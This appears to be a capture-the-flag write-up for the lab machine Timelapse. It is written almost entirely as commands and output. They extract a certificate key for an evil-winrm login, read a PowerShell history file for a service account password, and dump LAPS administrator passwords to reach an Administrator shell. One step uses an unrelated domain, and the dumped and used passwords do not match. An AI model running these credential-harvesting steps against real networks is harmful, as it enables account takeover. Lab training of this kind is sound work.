# Timelapse - legacyy_dev_auth.pfx / LAPS_readers

## Shell as Legacyy

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt -nodes
```

**evil-winrm:**

```bash
evil-winrm -S -k ./key.pem -c ./cert.crt -i 10.10.11.152
```

[image]

## Found svc_deploy password from PowerShell history

```bash
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
```

## LAPS (Local Administrator Password Solution)

Can read Administrator password.

[image]

## Shell as Administrator

### Way 1

```bash
get-ADComputer DC01 -Property "ms-mcs-admpwd"
```

[image]

### Way 2

```bash
impacket-GetLAPSPassword ignite.local/raj:Password@1 -dc-ip 192.168.1.48
```

### Way 3 - Metasploit gather/ldap_query

```
msf6 auxiliary(gather/ldap_query) > set rhosts 10.10.11.152
msf6 auxiliary(gather/ldap_query) > set username svc_deploy
msf6 auxiliary(gather/ldap_query) > set password 'E3R$Q62^12p7PLlC%KWaxuaV'
msf6 auxiliary(gather/ldap_query) > set domain timelapse.htb
msf6 auxiliary(gather/ldap_query) > set action ENUM_LAPS_PASSWORDS
msf6 auxiliary(gather/ldap_query) > run

Output:
 Name           Attributes
 ----           ----------
 cn             DC01
 ms-mcs-admpwd  59!O@mV)Q4H1Z8,&JUPbXd4W
```

[image]

```bash
evil-winrm -i 10.10.11.152 -u 'administrator' -p 'dCe8OxK;16DwuGQ1&VSfTz6-' -S
```

[image]
